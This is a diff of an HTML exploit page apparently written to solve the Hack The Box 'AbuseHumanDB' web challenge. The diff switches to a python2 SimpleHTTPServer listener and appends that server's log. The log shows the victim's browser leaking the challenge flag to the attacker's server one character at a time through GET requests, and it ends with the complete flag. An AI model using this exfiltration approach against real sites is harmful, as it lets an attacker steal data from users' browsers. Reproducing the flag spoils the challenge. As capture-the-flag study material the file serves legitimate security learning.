@@ -1,7 +1,7 @@
 <!-- https://github.com/lex1010/blog/blob/b32cb0922026cf81e4b67dbdc99add152049ca31/docs/HTB/Web/abusehumandb.md -->
 <!-- https://www.freebuf.com/articles/web/351065.html -->
 <!-- https://webhook.site -->
-<!-- python -m SimpleHTTPServer -->
+<!-- python2 -m SimpleHTTPServer -->
 
 <html>
 <script>
@@ -72,3 +72,33 @@ async function loop() {
 loop();
 </script>
 </html>
+
+<!-- root@ubuntu-s-1vcpu-1gb-lon1-01:~/htb/ctf/web/AbuseHumanDB# python2 -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+161.35.38.206 - - [13/Apr/2023 12:17:32] "GET /dec.html HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:33] "GET /?HTB{5 HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:34] "GET /?HTB{5w HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:34] "GET /?HTB{5w3 HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:34] "GET /?HTB{5w33 HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:35] "GET /?HTB{5w33t HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:36] "GET /?HTB{5w33t_ HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:37] "GET /?HTB{5w33t_a HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:37] "GET /?HTB{5w33t_al HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:38] "GET /?HTB{5w33t_ali HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:38] "GET /?HTB{5w33t_ali3 HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:38] "GET /?HTB{5w33t_ali3n HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:39] "GET /?HTB{5w33t_ali3nd HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:39] "GET /?HTB{5w33t_ali3ndr HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:39] "GET /?HTB{5w33t_ali3ndr3 HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:39] "GET /?HTB{5w33t_ali3ndr3n HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:40] "GET /?HTB{5w33t_ali3ndr3n_ HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:40] "GET /?HTB{5w33t_ali3ndr3n_0 HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:41] "GET /?HTB{5w33t_ali3ndr3n_0f HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:42] "GET /?HTB{5w33t_ali3ndr3n_0f_ HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:42] "GET /?HTB{5w33t_ali3ndr3n_0f_m HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:42] "GET /?HTB{5w33t_ali3ndr3n_0f_mi HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:42] "GET /?HTB{5w33t_ali3ndr3n_0f_min HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:42] "GET /?HTB{5w33t_ali3ndr3n_0f_min3 HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:43] "GET /?HTB{5w33t_ali3ndr3n_0f_min3! HTTP/1.1" 200 -
+161.35.38.206 - - [13/Apr/2023 12:17:43] "GET /?HTB{5w33t_ali3ndr3n_0f_min3!} HTTP/1.1" 200 -
+--> 
